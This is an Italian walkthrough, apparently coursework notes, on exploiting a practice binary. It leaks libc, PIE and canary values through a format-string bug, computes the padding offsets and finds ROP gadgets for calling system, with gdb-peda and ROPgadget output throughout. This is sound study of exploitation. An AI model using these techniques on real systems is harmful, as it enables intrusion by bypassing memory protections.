https://ironhackers.es/en/tutoriales/pwn-rop-bypass-nx-aslr-pie-y-canary/


Tenuto conto che:
- gli indirizzi di libc iniziano con 0x7f
- gli indirizzi che iniziano con 55 spesso (?) sono istruzioni dell'eseguibile

... lanciando step1.py scopriamo che in:

%0$lx - b'AAAA %0$lx'               è il nostro input
%1$lx - b'AAAA 10'
%2$lx - b'AAAA 1'
%3$lx - b'AAAA 7ffff7e94a37'        sembra un indirizzo in libc
%4$lx - b'AAAA 7ffff7f9ba70'        sembra un indirizzo in libc
%5$lx - b'AAAA 5555555596b0'        sembra un indirizzo dell'eseguibile
%6$lx - b'AAAA 7fffffffdcf8'        sembra un indirizzo in libc
%7$lx - b'AAAA 100000000'
%8$lx - b'AAAA 2438252041414141'    contiene parte del nostro input AAAA
%9$lx - b'AAAA a786c'
%10$lx - b'AAAA 0'
%11$lx - b'AAAA a3625ef621117600'    canary?
%12$lx - b'AAAA 1'
%13$lx - b'AAAA 7ffff7da9d90'        sembra un indirizzo in libc
%14$lx - b'AAAA 0'
%15$lx - b'AAAA 5555555551b6'        sembra un indirizzo dell'eseguibile
%16$lx - b'AAAA 100000000'
%17$lx - b'AAAA 7fffffffdcf8'        sembra un indirizzo in libc
%18$lx - b'AAAA 0'
%19$lx - b'AAAA ce42db69663e5e18'    canary?

step 2: LIBC Leak

Vediamo che in %3$lx abbiamo un indirizzo interno a libc, andiamo a rieseguire il codice all'interno di gdb, prendiamo tale valore e guardiamo poi con vmmap l'inizio di libc, calcolando così l'offset:
0x7ffff7e94a37 - 0x00007ffff7d80000 = 0x114A37
Questo offset non cambierà mai, in qualunque esecuzione (Anche con aslr attivo) l'offset sarà questo e potremo così trovare l'inizio di libc

step 3: Canary leak

Tra i dati visti al punto uno abbiamo due valori che sembrano casuali, il 11 ed il 19: uno di questi è probabilmente il canarino. Disassemblando il main troviamo verso il fondo questo codice:

   0x555555555255 <main+159>:	mov    eax,0x0
   0x55555555525a <main+164>:	mov    rdx,QWORD PTR [rbp-0x8]
=> 0x55555555525e <main+168>:	sub    rdx,QWORD PTR fs:0x28
   0x555555555267 <main+177>:	je     0x55555555526e <main+184>
   0x555555555269 <main+179>:	call   0x555555555090 <__stack_chk_fail@plt>

La verifica del canarino si basa sul registro rdx, possiamo quindi ora rilanciare il programma, impostare un breakpoint all'indirizzo 0x55555555525e, guardare i valori 11 e 19 ed osservare a quale di essi corrisponde il valore del registro rdx al momento in cui l'esecuzione si blocca sul bp: scopriamo così che il canarino è l'11.

step 3: PIE (Binary Base Leak)

Dobbiamo ora capire di quanto è lo sfasamento degli indirizzi nel codice del binario sotto attacco, sfasamento introdotto dalla protezione PIE. Il valore 5 sembra un indirizzo interno all'eseguibile, possiamo eseguire di nuovo, farci dare tale valore (che cambia ad ogni esecuzione) e controllare con vmmap qual è l'intervallo di indirizzi per l'esecuzione corrente, calcolando così l'offset.

gdb-peda$ vmmap
Start              End                Perm	Name
0x0000555555554000 0x0000555555555000 r--p	/home/vincenzo/Desktop/swsec_1/vuln
0x0000555555555000 0x0000555555556000 r-xp	/home/vincenzo/Desktop/swsec_1/vuln
0x0000555555556000 0x0000555555557000 r--p	/home/vincenzo/Desktop/swsec_1/vuln
0x0000555555557000 0x0000555555558000 r--p	/home/vincenzo/Desktop/swsec_1/vuln
0x0000555555558000 0x0000555555559000 rw-p	/home/vincenzo/Desktop/swsec_1/vuln

0x5555555596b0 - 0x0000555555554000 = 0x56B0

step 4: padding del canarino

Per questo generiamo con gdb un pattern senza ripetizioni, eseguiamo il programma e vediamo cosa troviamo in rdx al momento della verifica. Quando ci troviamo in bp all'istruzione 0x55555555525e troviamo
RDX: 0x3b41414441412841 ('(AADAA;A')
e con pattern_offset A(AADAA; otteniamo
gdb-peda$ pattern_offset (AADAA;A
(AADAA;A found at offset: 24

Trovato il padding del canarino possiamo procedere col trovare il padding del return. Per fare questo usiamo lo script step04.py che fa il leak del canarino al primo input ed al secondo invia un padding di 8 caratteri a cui concatena il canarino ed il pattern. Lo script avvia automaticamente gdb, esegue il leak, lo facciamo continuare fino a dopo l'input del pattern e quando si arresta nuovamente eseguiamo in gdb "pattern search". Con questo comando gdb cerca pezzi di pattern in tutti i registri, nello stack ed in qualunque altro posto e ci restituisce questo:

gdb-peda$ pattern search
Registers contain pattern buffer:
RBP+0 found at offset: 0
Registers point to pattern buffer:
[RSP] --> offset 8 - size ~58
Pattern buffer found at:
0x00005555555596d0 : offset    0 - size   64 ([heap])
0x00007fffffffde20 : offset    0 - size   64 ($sp + -0x8 [-2 dwords])
References to pattern buffer found at:
0x00007fffffffddc8 : 0x00007fffffffde20 ($sp + -0x60 [-24 dwords])

La riga che ci interessa è quella relativa a [RSP] dove vediamo un offset pari a 8: quella è la lunghezza del secondo blocco di caratteri junk che dobbiamo inserire per arrivare a sovrascrivere il ret:
'A'* 8 + canary + 'B'* 8 + ROP

step 5: Iniziamo a mettere assieme il tutto

Dobbiamo fare il leak di 3 cose ma non abbiamo abbastanza caratteri, dovremo quindi dividere in due l'ottenimento di informazioni. Il programma non ci consente però infiniti tentativi, dovremo quindi crearceli noi facendolo ripartire dal main dopo ogni tentativo. I primi due leak che dobbiamo fare riguardano PIE e canarino, possiamo poi proseguire con libc. Ci mancano però ancora alcuni dati.

Prima di tutto ci serve un modo per fare il pop del registro rdi visto che è il registro usato nei processori a 64bit per passare valori alla funzione che verrà chiamata (system nel nostro caso):
vincenzo@swsec-VirtualBox:~/Desktop/swsec_1$ ROPgadget --binary vuln | grep "pop rdi"
0x00000000000011ac : cli ; push rbp ; mov rbp, rsp ; pop rdi ; ret
0x00000000000011a9 : endbr64 ; push rbp ; mov rbp, rsp ; pop rdi ; ret
0x00000000000011af : mov ebp, esp ; pop rdi ; ret
0x00000000000011ae : mov rbp, rsp ; pop rdi ; ret
0x00000000000011b1 : pop rdi ; ret
0x00000000000011ad : push rbp ; mov rbp, rsp ; pop rdi ; ret



quando viene eseguita una chiamata a system il registro RSP deve contenere un valore 16-aligned, quindi terminare per 0, altrimenti l'istruzione 
movaps XMMWORD PTR [rsp],xmm0
va in SIGSEGV